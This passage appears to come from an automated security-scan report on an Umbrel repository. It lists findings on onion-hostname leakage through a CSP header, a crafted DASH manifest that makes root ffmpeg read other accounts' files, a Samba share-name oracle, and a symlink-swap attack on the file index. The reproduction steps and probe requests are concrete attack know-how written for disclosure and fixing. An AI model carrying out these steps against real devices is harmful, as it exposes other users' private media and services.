Nothing on this path authenticates the caller or ties the parameters to a real Tor login: `origin` is attacker-asserted via the query rather than derived from the request's actual hostname (contrast `app-gateway.ts:298`, which derives origin from `request.hostname.endsWith('.onion')`), and `app` may name any installed app, not the one whose gateway issued the redirect. The code comment (lines 122-125) intends to allow "the app's exact onion hostname when the login originated over Tor" — a requester who legitimately arrived from that onion already knows it — but the implementation hands out any installed app's onion to anyone. An unauthenticated LAN/Tailscale peer issues `GET http://<device>:2000/?app=<appId>&origin=tor` (or `/app-auth/?app=<appId>&origin=tor` on :80/:443) and reads the onion from the response header; `GET /v1/apps?app=<id>` (also unauthenticated; 200 with id/name for installed apps, 500 otherwise) confirms which ids to probe. A Tor peer who was given a single app's onion is redirected by the gateway to the auth onion (`app-gateway.ts:305-313`) and can enumerate every other app's onion there, defeating the per-app separation of hidden services.

Elsewhere umbreld treats these values as authenticated data: per-app `hiddenService` is returned only by `apps.list` (`privateProcedureWithMembers`) and the dashboard onion only by `system.hiddenService` (`privateProcedure`); the UI shows them only in authenticated settings as the owner's "remote access URL". A v3 onion address is the only thing standing between LAN-only and Internet-wide reachability: per `legacy-compat/app-script` the app onion forwards `80 -> ${GATEWAY_IP}:${APP_PROXY_PORT}`, the same front door the app-gateway serves on the LAN. Disclosure gives a remote attacker a globally reachable copy of the app's login gateway (and of the app itself for manifests shipping `PROXY_AUTH_ADD=false`, which the UI acknowledges some apps do), enabling unthrottled password guessing against `validateAccountLogin` from outside the home network and linking the device to the onion services it runs. The hostname file persists on disk, so the leak also occurs while Tor is currently switched off.

Root cause: a response-header side effect that depends on an owner-tier lookup (`readHiddenService`) is driven purely by attacker-controlled query parameters, with no check that the request arrived over Tor or that the app id matches the originating gateway.

## Evidence
1. [packages/umbreld/source/modules/server/app-auth.ts:59–83](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/app-auth.ts#L59-L83)
   appHandoffFormAction reads request.query.app / request.query.origin from any unauthenticated request; when origin === 'tor' it calls umbreld.apps.getApp(appId).readHiddenService() and allowAppHandoffFormAction writes the resulting .onion hostname into the Content-Security-Policy response header (form-action 'self' http://<onion>). origin is query-asserted, not derived from request.hostname, and appId is any installed app; no principal or credential is checked.
2. [packages/umbreld/source/modules/server/app-auth.ts:120–127](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/app-auth.ts#L120-L127)
   The middleware is installed with router.use() as the first layer of the app-auth router, so it runs for every request including the public static/SPA fallback (router.get('*')) and the public /v1/account/accounts, /v1/apps endpoints. The comment states the intent (the originating app's onion when the login originated over Tor), which the code does not enforce.
3. [packages/umbreld/source/modules/server/index.ts:211–213](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L211-L213)
   The router is mounted at /app-auth on the main umbreld Express app, so it is reachable through the browser-facing app-auth port 2000 (lan-ingress rewrites onto this prefix), via the dashboard ports 80/443 at /app-auth/..., and over Tor on the auth onion (tor-server-torrc: HiddenServicePort 80 10.21.0.1:2000). Helmet CSP applied at app level (lines ~113-129) guarantees a policy header exists for the middleware to extend.
4. [packages/umbreld/source/modules/app-gateway/app-gateway.ts:298–313](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/app-gateway/app-gateway.ts#L298-L313)
   The gateway derives origin from request.hostname.endsWith('.onion') and redirects unauthenticated Tor visitors of any single app onion to the shared auth onion with ?origin=tor&app=<id>. A peer trusted with one app's onion therefore learns the auth onion and can enumerate every other installed app's onion through the vulnerable middleware.
5. [packages/umbreld/source/modules/server/app-auth.ts:210–214](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/app-auth.ts#L210-L214)
   Supporting oracle: GET /v1/apps?app=<id> is also unauthenticated and returns the manifest id/name for installed apps (500 via the error handler otherwise), letting the attacker confirm which app ids to probe for onion hostnames.
6. [packages/umbreld/source/modules/apps/routes.ts:96–128](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/routes.ts#L96-L128)
   Everywhere else the per-app hiddenService value is returned only through the authenticated apps.list procedure (privateProcedureWithMembers, line 63), and system.hiddenService is owner-only (privateProcedure, system/routes.ts:211), establishing that the project treats onion hostnames as authenticated data.
7. [packages/umbreld/source/modules/apps/legacy-compat/app-script:303](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/legacy-compat/app-script#L303)
   TOR_HS_PORTS="80:${GATEWAY_IP}:${APP_PROXY_PORT}" shows the app onion forwards to the app's public port on the host, i.e. to the app-gateway front door for that app (auth enabled unless the app ships PROXY_AUTH_ADD=false, app-gateway.ts:95). Knowing the onion therefore gives Internet-wide reachability of the app's login gateway, or of the app itself for auth-disabled apps.

## Impact
Confidentiality: discloses the owner-gated Tor hidden-service identifiers for every installed app (plus the installed-app list via the oracle). This converts LAN-only exposure of each app's login gateway into Internet-wide exposure (unthrottled password guessing against validateAccountLogin; direct access to apps shipping PROXY_AUTH_ADD=false), lets a peer trusted with one app's onion discover all others, and links the device to its onion services. The data itself is identifiers rather than credentials or user content, so confidentiality impact is limited. No direct integrity or availability impact.

## Reproduction steps
1. Attacker is any unauthenticated network peer able to reach the device's public ports (LAN, Tailscale, the auth onion over Tor, or a browser coerced via DNS rebinding, which can read same-origin response headers). They send a plain GET with two query parameters to the app-auth port, to /app-auth on the dashboard port, or to the auth onion, and read the Content-Security-Policy response header. No credentials, no user interaction. Attack requirement: remote Tor access must have been enabled at some point so per-app hostname files exist on disk.

## Recommended fix
1. allowAppHandoffFormAction derives the CSP form-action target, including an owner-tier readHiddenService lookup, from unauthenticated, attacker-asserted query parameters on every request to the app-auth router, so any installed app's exact onion hostname is emitted to any requester. Fix criteria: The exact per-app onion hostname must not appear in any response to an unauthenticated request. Since the login document itself is pre-auth, satisfy the Tor handoff without naming the onion: e.g. use a CSP host-source wildcard such as http://*.onion for the Tor form-action, or complete the Tor handoff via the fixed auth onion/redirect rather than a cross-origin form POST. At minimum, derive the Tor origin from the request's actual hostname (as app-gateway.ts:298 does) instead of a query parameter and only emit a hostname for the app the gateway redirected from. Verify: an unauthenticated GET /app-auth/?app=<installed>&origin=tor from a LAN address, and from the auth onion with a different app id, returns a CSP header containing no exact .onion hostname.
2. GET /app-auth/v1/apps?app=<id> answers 200 with id/name for any installed app and 500 otherwise, without authentication, giving an installed-app oracle that makes onion enumeration trivial. Fix criteria: Unauthenticated probes for arbitrary app ids must be indistinguishable between installed and not-installed apps; return app metadata only for an app id bound to a gateway-issued redirect or to a valid app-gateway credential. Verify that unauthenticated requests for installed and uninstalled ids produce identical status codes and bodies.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Information disclosure
**CWE:** [CWE-200](https://cwe.mitre.org/data/definitions/200.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257913

---

# Content-probed DASH manifest in uploaded video makes root ffmpeg read other accounts' media

## Details
umbreld's video enrichment runs two ffmpeg-family tools as root on a descriptor of an untrusted file and lets the tool pick the demuxer by sniffing the bytes. extractVideoMetadata runs `ffprobe -v error -show_entries ... -of json /dev/fd/3`; generateThumbnailFiles runs `convert <coder>:/dev/fd/3[0] ...`, where the coder for every VIDEO_EXTENSIONS name (MP4, MOV, MKV, WEBM, AVI, ...) is an ImageMagick video coder whose delegate is `ffmpeg -i <input>`. Neither invocation passes `-f`, `-protocol_whitelist`, `-allowed_extensions` or any demuxer restriction, and the input name `/dev/fd/3` carries no extension, so format selection rests entirely on the first bytes. photoKind classifies by extension alone, so a text file named `clip.mp4` is routed to this tooling; member homes are index roots of kind 'home', which BACKGROUND_ENRICHMENT_ROOT_SQL enriches proactively, so a member's upload is processed with no owner interaction. runBoundedMediaProcess adds only a timeout: no uid change, sandbox or network restriction.

The weakness is an externally controlled file reference: an uploaded body whose bytes are an MPEG-DASH MPD (`<MPD ... profiles="urn:mpeg:dash:profile:...">`) is claimed by ffmpeg's DASH demuxer, which opens, as root, the absolute paths and http(s) URLs the manifest names and feeds the first one that exists to the probe/decode step. The resulting renditions and metadata are keyed by the BLAKE3 hash of the attacker's own file and served to the attacker through the ordinary thumbnail and Photos routes, so no race is needed.

Dependency assumptions (not verifiable in this checkout): ffmpeg and imagemagick come from the Debian trixie APT snapshot pinned in packages/os/umbrelos.Dockerfile (APT_SNAPSHOT_DATE=20260727), i.e. ffmpeg 7.1.x built with `--enable-libxml2` (which compiles the DASH demuxer) and ImageMagick 7.1.x. In that ffmpeg: (1) `dash_probe` returns AVPROBE_SCORE_MAX whenever the probe buffer contains `<MPD` and `dash:profile`, with no filename or MIME gating - the 7.1 hardening that defeats the HLS route (`hls_probe` requires an .m3u8/.m3u name or HLS MIME type) was not applied to DASH; (2) dashdec's `open_url` admits `file` URLs whose extension is in the default `allowed_extensions` (`aac,m4a,m4s,m4v,mov,mp4,webm,ts`, matched case-insensitively) and any `http(s)` URL, and opens them with `avio_open2`, so the outer context's `file,crypto,data` whitelist is not inherited (and would admit `file` anyway); (3) an absolute `<BaseURL>` or `<SegmentURL media="/abs/path.mov">` passes `resolve_content_path`/`ff_make_absolute_url` unchanged; (4) a fragment that fails to open is logged and skipped (`cur_seq_no++`), so one `<SegmentList>` can try hundreds of candidate paths; (5) the per-representation demuxer is content-probed (mov for a real video) and its `nested_io_open` forbids further opens, which is irrelevant because the first level already read the target. The ffprobe sink alone discloses codec, width and height even if the ImageMagick delegate were policy-blocked. The umbreld-side fix is independent of the ffmpeg version. QuickTime `dref` external references in the mov demuxer are a further content-selected route not traced here.

## Evidence
1. [packages/umbreld/source/modules/files/file-index-enrichment.ts:2360–2383](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L2360-L2383)
   extractVideoMetadata runs `ffprobe -v error -show_entries ... -of json /dev/fd/3` with no `-f` demuxer pin, no `-protocol_whitelist`, and an extensionless input name. ffprobe therefore selects the demuxer purely from the first bytes; an XML body containing `<MPD` and `dash:profile` is claimed by the DASH demuxer, which opens the segment URLs the manifest names.
2. [packages/umbreld/source/modules/files/file-index-enrichment.ts:2771–2812](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L2771-L2812)
   generateThumbnailFiles builds the `convert` argument list ending in `<coder>:/dev/fd/3[0]`. For video extensions the coder is ImageMagick's MP4/MOV/MKV/... coder, which hands the input name to the `ffmpeg` delegate; that ffmpeg is again unpinned, so it probes the same manifest and decodes the first frame of whatever segment it opens into the three renditions.
3. [packages/umbreld/source/modules/files/file-index-enrichment.ts:2863–2875](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L2863-L2875)
   mediaProcessInput returns the bare `/dev/fd/3`; imageMagickMediaProcessInput only prepends an ImageMagick coder name from IMAGE_MAGICK_MEDIA_CODERS. Nothing here constrains which ffmpeg demuxer or protocol is used for the bytes.
4. [packages/umbreld/source/modules/files/file-index-enrichment.ts:2877–2890](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L2877-L2890)
   runBoundedMediaProcess spawns ffprobe/convert via execa with only a timeout and fd 3 wired to the source; no uid change, sandbox, or network restriction. umbreld runs as root, so the child inherits read access to every account's files and unrestricted outbound networking.
5. [packages/umbreld/source/modules/files/file-index-enrichment.ts:660–671](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L660-L671)
   #backgroundStep hashes each newly indexed entry of a home/trash root and, when photoKind(systemPath) matches (any VIDEO_EXTENSIONS name), immediately runs #backgroundThumbnailStep and #backgroundMediaStep for it. A member's upload is processed with no owner interaction.
6. [packages/umbreld/source/modules/files/file-index-enrichment.ts:1385–1390](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L1385-L1390)
   #ensureContentThumbnail opens the member's file with openContentRevision and passes its descriptor to #generateThumbnails, i.e. to the convert/ffmpeg invocation above.
7. [packages/umbreld/source/modules/files/file-index-enrichment.ts:893–898](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L893-L898)
   #ensureMediaMetadata opens the file and calls #extractMediaMetadata with the descriptor, reaching extractVideoMetadata's ffprobe for video extensions.
8. [packages/umbreld/source/modules/photos/types.ts:36–57](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/types.ts#L36-L57)
   photoKind classifies by extension only. Naming the manifest `clip.mp4` (or .mov, .mkv, .webm, .avi, .360, .insv, ...) is enough to route it to the video tooling; the bytes are never checked against the extension.
9. [packages/umbreld/source/modules/files/files.ts:417–432](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L417-L432)
   Every member home is registered as an index root of kind 'home', the kind matched by BACKGROUND_ENRICHMENT_ROOT_SQL, so member uploads are enriched proactively.
10. [packages/umbreld/source/modules/files/thumbnails.ts:71–87](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/thumbnails.ts#L71-L87)
   The attacker retrieves the result through the ordinary thumbnail route: the renditions are keyed by the BLAKE3 hash of the attacker's own manifest file, so resolveThumbnailRequest authorizes them against the attacker's own path with no race; Photos' /thumb/:id and the member's Photos library (width/height/duration from ffprobe) expose the same result.
11. [packages/os/umbrelos.Dockerfile:421](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/umbrelos.Dockerfile#L421)
   ffmpeg and imagemagick come from the Debian trixie APT snapshot (ARG APT_SNAPSHOT_DATE=20260727), i.e. ffmpeg 7.1.x as packaged by Debian; the behaviour of its DASH demuxer is the dependency assumption this finding rests on.

## Impact
Cross-account disclosure of the first frame (up to 1280px) plus codec, width and height of any root-readable video/audio file the attacker can name - other accounts' private media, app data, external/network storage - together with a file-existence oracle and blind outbound HTTP GETs issued by root ffmpeg to attacker-chosen LAN, loopback or internet hosts. Only containers with the demuxer's allowed extensions and one frame per crafted file are exposed, and the ffmpeg behaviour is an unverified dependency assumption, so confidentiality impact is rated partial. No integrity impact; CPU use is bounded by the 60 s timeout.

## Reproduction steps
1. Attacker: an authenticated member (named adversary) uploading through POST /api/files/upload (authorizeDashboardRequest admits any account) or Photos. Delivery: one small MPD text file named clip.mp4 listing candidate owner/member/app-data media paths; background enrichment runs ffprobe and convert as root within seconds, with no owner action and no defence to bypass. Success depends on conditions outside the attacker's control: the pinned Debian ffmpeg behaving as assumed, and victim media existing at guessable paths with an allowed extension (Photos/iPhone folders are predictable; hundreds of paths per manifest). Results are read back via the attacker's own thumbnail URL and Photos item.

## Recommended fix
1. ffprobe and the ImageMagick ffmpeg delegate select the demuxer by sniffing attacker-controlled bytes, so manifest-type demuxers (DASH, and any future content-probed playlist format) that open other local files or URLs are reachable from an uploaded 'video'. Fix criteria: umbreld fixes the demuxer from the file extension (explicit `-f` per extension) and restricts protocols (`-protocol_whitelist file,pipe`) for ffprobe, and renders video thumbnails through a direct, equally restricted ffmpeg invocation rather than ImageMagick's delegate. Verify that an MPD named *.mp4 referencing an existing local .mov yields a failed thumbnail and failed metadata, and that strace shows no open() of any path other than /dev/fd/3 and no socket connections.
2. The enrichment tools run as root with full filesystem and network access, so any parser-side file reference immediately crosses the account boundary. Fix criteria: Thumbnail and metadata extraction runs with a dedicated unprivileged identity and without network access (e.g. separate uid, no CAP_DAC_READ_SEARCH, network namespace or seccomp), so a demuxer-level reference to another account's file or to a URL fails. Verify that the same manifest cannot open a file owned by another account when run through the enrichment worker.

---
**Severity:** LOW
**Status:** Open
**Category:** External control of file path
**CWE:** [CWE-73](https://cwe.mitre.org/data/definitions/73.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258398

---

# Samba share-name collision loop spans all accounts, letting members probe owner share names

## Details
umbrelOS 2.0 lets member accounts export directories from their own private home (`/Users/<slug>/...`) over Samba via `files.addShare`, and lists them with `files.shares`. Samba.addShare() (samba.ts:639-652) chooses the stored display `name` for the new record with a loop inherited from the single-user design: starting from the directory basename, it appends ` (2)`, ` (3)`, ... while *any* record in the global `files.shares` array has a case-insensitively equal `name` — the array holds the owner's shares and every member's shares. The chosen name is stored on the member's record and returned to the member by `listShares(userId)` (samba.ts:594-611), both directly as `name` and embedded in `sharename` via `#preferredSharename`.

This turns the collision counter into a cross-account oracle. A member creates `/Users/<slug>/<probe>` in their home (createDirectory), calls `files.addShare({path: '/Users/<slug>/<probe>'})`, reads `files.shares`, and removes the share again. If the returned name is `<probe> (2)` instead of `<probe>`, some other account — in practice the owner, who is the only one who can export `/Home/*`, `/External/<label>` and `/Apps/<appId>` — has a Samba share whose directory basename is `<probe>` (case-insensitive). The count of suffixes additionally reveals how many such shares exist. Because owner Samba share names are directory basenames, this discloses the existence of owner folders/exports the member has no grant to see: external drive labels, exported app ids under /Apps, and private /Home subfolder names. Nothing in getAllowedOperations or member-shares is consulted by the loop; it is pure global-state reflection.

The maintainers' own `#preferredSharename` (samba.ts:511-530) and `#resolveSharenames` isolate the *sharename* namespace per account precisely so members cannot observe or disturb other accounts' mount names, which shows account isolation of Samba naming is intended; the `name` collision loop in addShare was left operating on the global list. Impact is confidentiality-only and limited to existence/count of same-basename shares owned by other accounts; a member cannot read or alter the owner's shares through this path.

## Evidence
1. [packages/umbreld/source/modules/files/samba.ts:639–651](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/samba.ts#L639-L651)
   addShare() reads the global `files.shares` array (owner's and every member's records) and derives the stored `name` from the requested path's basename, incrementing a ` (N)` suffix while ANY record has a case-insensitively equal `name`. The suffix therefore encodes whether another account exports a directory with that basename, and the result is persisted on the requesting member's own record. This is the code the fix must change: scope the collision check to `share.userId === userId`.
2. [packages/umbreld/source/modules/files/samba.ts:594–610](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/samba.ts#L594-L610)
   listShares(userId) filters records to the caller's account but returns the stored `name` (and `sharename`, which embeds it via #preferredSharename), so the cross-account suffix computed in addShare is reflected back to the member.
3. [packages/umbreld/source/modules/files/routes.ts:396–409](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/routes.ts#L396-L409)
   files.shares, files.addShare and files.removeShare are privateProcedureWithMembers, so an authenticated member can run the add -> list -> remove probe cycle against their own home paths with no owner involvement (createDirectory at routes.ts:191 is member-reachable too).
4. [packages/umbreld/source/modules/files/files.ts:1942–1944](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1942-L1944)
   getAllowedOperations keeps the `share` operation for a member only on paths they own (`ownerOfPath(virtualPath) === userId`), i.e. directories under /Users/<id>/; this is the gate addShare checks, and it is satisfied by any directory the member creates in their own home.
5. [packages/umbreld/source/modules/files/samba.ts:51–53](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/samba.ts#L51-L53)
   The generated smb.conf sets `access based share enum = yes`, `restrict anonymous = 2`, `map to guest = never` under the comment 'Make sure that we are not leaking information', so over SMB a member cannot enumerate shares they are not a `valid user` of. The project therefore does not concede other accounts' share names to members; the addShare collision loop leaks via tRPC what this control hides on the SMB side.
6. [packages/umbreld/source/modules/files/samba.ts:511–529](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/samba.ts#L511-L529)
   #preferredSharename places member share names in a separate `(User <id>)` namespace so one account cannot disturb another's mount names, showing account isolation of Samba naming is intended; the pre-existing single-user `name` collision loop in addShare was not updated to that model.

## Impact
Discloses to a member the existence (and count) of owner or other-member Samba exports whose directory basename case-insensitively matches a guess, e.g. external drive labels under /External, app ids exported under /Apps, private /Home subfolder names, none of which the member has a share grant for and none of which Samba itself exposes to them (`access based share enum = yes`). One guess per cycle; no data contents, integrity or availability impact.

## Reproduction steps
1. Attacker is an authenticated member account reaching umbreld's tRPC over the LAN/Tailscale dashboard, for whom the owner has enabled Samba access (setMemberSambaAccess, owner-only) so #assertAccess passes. From their own home they create a directory named after a guess (files.createDirectory), add it as a Samba share (allowed for own-home directories per files.ts:1942-1944), read files.shares, observe whether the stored name gained a ` (2)` suffix, then remove the share. Each cycle is three ordinary tRPC calls with no owner interaction, no race and no defence to bypass; the only precondition outside the attacker's control is that the owner granted the member Samba access, a normal feature grant (AT:P).

## Recommended fix
Samba.addShare computes the member-visible `name` by de-duplicating against the global `files.shares` list (all accounts), so the resulting suffix encodes other accounts' share basenames and is reflected to the requesting member via listShares. Fix criteria: The stored/returned `name` for a share must depend only on the requesting account's own shares (or be made globally unique without observable dependence on other accounts' records, e.g. by scoping the collision check to `share.userId === userId`). After the fix, adding a share whose basename equals another account's existing share basename must yield an unsuffixed name identical to the case where no such share exists, and listShares output for a member must be independent of other accounts' share records.

---
**Severity:** LOW
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-203](https://cwe.mitre.org/data/definitions/203.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258340

---

# File index resolves entry paths through intermediate symlinks, enriching other accounts' media into a member's library

## Details
The file index engine treats `relativePathWithin(root.systemPath, systemPath)` (string arithmetic, file-index/paths.ts:12-19) as proof that an entry lives inside its root and then performs every filesystem operation on the unresolved path. `lstat`, `open(O_NOFOLLOW)` and `opendir` refuse to follow only the final path component; any intermediate directory that is a symbolic link is followed by the kernel. Nothing in the engine or the enrichment compares `realpath(root.systemPath + relative_path)` with the lexical path.

A member can plant an escaping symlink in their own home with `files.unarchive` (member-tier, routes.ts:323; `unar -force-overwrite` at archive.ts:217 materialises symlink entries — api.ts:333-334 and archive.ts:138 acknowledge that extraction creates symlinks). The symlink itself cannot be moved (`virtualToSystemPath` realpaths it and throws `[escapes-base]`), but a real directory that *contains* it can be renamed freely: `files.rename`/`files.move` (member-tier, routes.ts:227/250) realpath only the directory being moved (files.ts:1253-1283, 2199-2232) and never inspect its contents.

Flow (no shell, member `m`, home root R=`<data>/members/m/home`, victim V=`<data>/home/Photos` or another member's home):
1. Upload a real `R/arc/real/A/x.jpg` (any supported extension, name guessed to exist in V). The index writes row E (`arc/real/A/x.jpg`, thumbnail_identity_kind 'content'). Extract an archive containing `link/A -> V` so `R/arc/link/A` is the symlink. Keep E pending (upload a backlog of images, or swap within the 1 s BACKGROUND_QUIET_PERIOD_MS) so some enrichment step for E has not run yet.
2. `files.rename(/Users/m/arc/real -> real-old)` then `files.rename(/Users/m/arc/link -> real)`. Now `R/arc/real/A` is the symlink and `R/arc/real/A/x.jpg` resolves to `V/x.jpg`. `movePath(R/arc/real, R/arc/real-old)` first awaits `reconcilePath(destination)` → a full root scan (engine 1286-1300, 1319-1347) and only in its `finally` calls `removePath(source)`, so E stays alive for the whole scan. Every member `createDirectory` → `reconcilePath` → `reconcileRoot(..., 'directory-changed')` sets `rerun`/`rerunRequested` (engine 866-891); a superseded pass skips its delete-unseen step and loops, so the member prolongs the window indefinitely. The watcher's own reconcile of `R/arc/real` writes a 'symbolic-link' row without deleting descendants (write mutation has no child purge).
3. The background lane (`#nextEntryNeedingHash`, home/trash roots) or an earlier on-demand `ensureThumbnail` opens `join(root_system_path, relative_path)` = `R/arc/real/A/x.jpg` with O_NOFOLLOW (enrichment 2205-2231) — the kernel follows the intermediate symlink and opens `V/x.jpg`. The fstat identity differs from E → StaleFileRevisionError → `onStalePath` → `reconcilePath` → `#reconcileSystemPath` lstat()s through the symlink and `#entryWrite` rewrites E with V/x.jpg's dev/inode/size/mtime (engine 1319-1393), marking it reconciliation_seen while the scan is active (1395-1402). On the next pass the identity matches: root hashes `V/x.jpg` (BLAKE3), runs ImageMagick/ffprobe/exiftool on it, writes renditions under `<data>/thumbnails/content/<hash>/`, and `onContentAttached` → `attachContentHash` registers the content for `index_roots.owner_id` = m (photos/repository.ts:587-600), auto-creating m's 'umbrel' source with scope 'everything' (`#ensureSource`).
4. Member-tier `photos.items.list/get` (photos/routes.ts:92-104, library-sql.ts:94-117) then returns the owner's photo as an item in m's library with taken-at, camera make/model/lens, GPS latitude/longitude/altitude, user comment, fileName and path, and the content hash as the item id.

No race is required for the indexing/metadata disclosure; the swap can land any time while E is pending and the window is member-controlled. Retrieving the rendered thumbnail bytes additionally needs the realpath-vs-lstat gap in thumbnails.ts resolveThumbnailRequest (same class as files-view-download-path-toctou-symlink-swap). Filenames in the victim directory must be guessed; a miss fails silently (ENOENT → row deleted). Assumptions: unar as shipped (umbrelos.Dockerfile:421, Debian) extracts symlink entries, as the project's own comments state; Linux lstat/open(O_NOFOLLOW) follow intermediate symlinks. The unit test 'indexes accurate metadata and never follows symlinks' (file-index.unit.test.ts:808) covers only a symlink the crawler meets statically, not a per-path reconcile after a parent swap. The related crawler opendir race is a separate candidate (file-index-crawler-opendir-directory-symlink-swap).

## Evidence
1. [packages/umbreld/source/modules/files/file-index-engine.ts:1319–1356](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L1319-L1356)
   #reconcileSystemPath derives relative_path with the purely lexical relativePathWithin() and then lstat()s the caller-supplied system path. lstat only refuses to follow the final component; any intermediate directory component that is a symlink is followed, so the identity (dev/inode/size/mtime) written into the index is that of a file outside the root while relative_path stays inside the root.
2. [packages/umbreld/source/modules/files/file-index-engine.ts:1362–1392](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L1362-L1392)
   #entryWrite records the lstat()ed identity under the in-root relative path with thumbnail_identity_kind 'content' for home roots and never checks that root.systemPath + relativePath is symlink-free (no realpath comparison, no O_NOFOLLOW per component).
3. [packages/umbreld/source/modules/files/file-index-engine.ts:371–374](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L371-L374)
   reconcilePath is wired in as the enrichment's onStalePath callback. When the enrichment opens an entry's path and finds the identity no longer matches (exactly what happens once a parent has been swapped for a symlink), it calls back here and the engine re-lstat()s through the symlink and rewrites the row with the foreign file's identity, after which the enrichment's identity check passes.
4. [packages/umbreld/source/modules/files/file-index-engine.ts:1395–1401](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L1395-L1401)
   #writeEntries marks any live write for the root currently being scanned as reconciliation_seen, so a row refreshed through the symlink during a root scan survives the scan's delete-unseen step even though the walker (correctly) never descended into the symlink.
5. [packages/umbreld/source/modules/files/file-index-engine.ts:1286–1317](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L1286-L1317)
   movePath awaits reconcilePath(destination) — a full root scan for a directory destination — before its finally block calls removePath(source), so the renamed-away directory's rows (including E under the now-symlinked path) stay alive for the entire scan.
